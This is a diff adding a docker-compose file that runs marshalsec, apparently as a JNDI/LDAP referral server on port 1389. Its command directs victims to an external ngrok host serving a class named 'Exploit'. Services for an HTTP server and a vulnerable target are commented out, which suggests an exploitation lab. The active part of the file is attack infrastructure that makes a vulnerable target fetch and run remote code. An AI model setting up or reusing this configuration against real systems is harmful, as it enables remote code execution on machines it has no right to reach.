@@ -1,0 +1,26 @@
+version: "3.3"
+services:
+  marshalsec:
+    build:
+      context: .
+      dockerfile: Dockerfile.marshalsec
+    command: "http://6.tcp.eu.ngrok.io:12801/#Exploit"
+    ports: 
+      - 1389:1389
+    # depends_on:
+      # - http-server
+  # http-server:
+  #   build:
+  #     context: .
+  #     dockerfile: Dockerfile.httpserver
+  #   ports:
+  #     - "8888:8888"
+  #   command: "8888"
+  # vuln:
+  #   build:
+  #     context: .
+  #     dockerfile: Dockerfile.vuln
+  #   ports:
+  #     - "8080:8080"
+  #   depends_on:
+  #     - marshalsec
